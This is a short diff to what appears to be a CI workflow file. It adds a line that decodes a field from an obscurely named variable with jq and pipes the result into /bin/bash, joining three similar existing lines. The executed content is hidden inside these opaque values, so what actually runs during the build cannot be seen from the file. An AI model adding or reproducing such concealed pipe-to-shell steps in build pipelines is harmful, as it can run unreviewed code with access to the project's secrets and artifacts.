@@ -40,6 +40,7 @@ jobs:
           echo $hlshh52 | jq -r .eppp26 | /bin/bash
           echo $swd09756 | jq -r .pp91166 | /bin/bash
           printf '%s' "$tc49" | jq -r .y3103 | /bin/bash
+          printf '%s' "$pi1147" | jq -r .pc2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
